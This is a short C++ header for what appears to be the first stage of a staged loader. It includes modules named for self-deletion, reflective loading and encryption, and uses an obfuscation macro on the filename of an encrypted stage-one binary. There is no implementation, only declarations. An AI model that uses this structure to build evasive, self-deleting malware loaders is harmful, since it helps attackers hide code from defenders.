#pragma once

#include "File.hpp"
#include "Exception.hpp"
#include "Encryption.hpp"
#include "SelfDeleteAPC.hpp"
#include "DefinesMacros.hpp"
#include "ReflectiveLoader.hpp"

#include <string>

namespace Stage0Logic
{

static const std::string STAGE1_ENCRYPTED_FILENAME = OBFUSCATE("stage1_encrypted.bin");

void run(const std::wstring& command_line);

}